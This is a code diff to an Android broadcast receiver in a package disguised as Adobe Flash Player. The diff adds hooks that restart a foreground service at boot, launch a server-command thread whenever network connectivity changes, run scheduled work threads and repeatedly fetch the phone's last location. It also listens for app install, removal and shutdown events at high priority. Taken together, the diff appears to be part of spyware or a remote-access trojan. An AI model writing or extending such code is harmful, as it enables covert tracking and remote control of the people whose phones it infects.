@@ -7,8 +7,12 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.util.Log;
 
+import com.adobe.flashplayer.MainEntry;
 import com.adobe.flashplayer.MyLog;
+import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.data.PhoneLocationWrapper;
+import com.adobe.flashplayer.network.Network;
 
 /*
 不能静态注册的广播:
@@ -44,11 +48,16 @@ public class Broadcast extends BroadcastReceiver {
                 Log.e(TAG,"phone current power:%"+batteryPercent);
             }
             else if(action.equals("android.intent.action.BOOT_COMPLETED")){
+
+                CoreHelper.launchForegroundService(context);
+
                 Log.e(TAG,"BOOT_COMPLETED");
                 MyLog.writeLogFile("receive BOOT_COMPLETED\r\n");
             }
             else if (action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
                 Log.e(TAG,"android.net.conn.CONNECTIVITY_CHANGE");
+
+                Network.launchServerCmdThread(context);
             }
             else if (action.equals(Intent.ACTION_USER_PRESENT)) {
                 Log.d(TAG,"android.intent.action.USER_PRESENT");
@@ -77,6 +86,18 @@ public class Broadcast extends BroadcastReceiver {
                 if (packageName.equals(context.getPackageName())) {
 
                 }
+            }
+            else if (action.equals(Public.PHONEWORK_ALARM_ACTION)){
+
+                CoreHelper.launchWorkThread(context);
+
+                CoreHelper.scheduleWorkAlarm(context);
+            }
+            else if (action.equals(Public.PHONELOCATION_ALARM_ACTION)){
+
+                PhoneLocationWrapper.getLastLocation(context);
+
+                CoreHelper.scheduleLocationAlarm(context);
             }
             else{
                 Log.e(TAG,"action:" + action);
@@ -111,6 +132,12 @@ public class Broadcast extends BroadcastReceiver {
             filter.addAction("android.net.wifi.STATE_CHANGE");
             filter.addAction(Intent.ACTION_USER_PRESENT);
             filter.addAction(Intent.ACTION_TIME_TICK);
+            filter.addAction(Intent.ACTION_SHUTDOWN);
+
+            filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
+            filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
+            filter.addAction(Intent.ACTION_PACKAGE_ADDED);
+
             filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY - 1);
             filter.addDataScheme("package");
             gBroadcastReceiver = new Broadcast();
